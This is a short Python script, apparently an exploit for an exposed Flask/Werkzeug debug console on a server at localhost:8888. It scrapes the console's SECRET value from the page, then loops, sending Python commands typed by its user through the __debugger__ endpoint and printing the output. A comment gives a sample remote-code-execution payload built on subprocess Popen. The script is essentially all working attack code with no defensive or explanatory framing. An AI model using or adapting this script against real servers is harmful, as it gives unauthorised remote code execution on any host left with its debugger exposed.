import requests
import re
from urllib.parse import quote

HOST = "http://localhost:8888"

secret_re = re.compile(r"""SECRET = "(?P<secret>.*)";""")
path_struct = "/console?&__debugger__=yes&cmd={}&frm=0&s={}"

ss = requests.Session()
secret = None

# RCE cmd for python
# from subprocess import Popen; Popen("whoami", shell=True, stdout=-1).stdout.read()

# Get secret
resp = ss.get(HOST + "/console").text
mo = secret_re.search(resp)
if mo:
  secret = mo.group("secret")
  print("Got server secret:", secret)
  print("Enter python command:")
  cmd = input(">>")
  while cmd:
    path = path_struct.format(quote(cmd), secret)
    resp = ss.get(HOST + path)
    resp = '\n'.join(resp.text.split("\n")[1:])
    print(resp)
    cmd = input(">>")
else:
  print("Server is secure!, secrete not found")
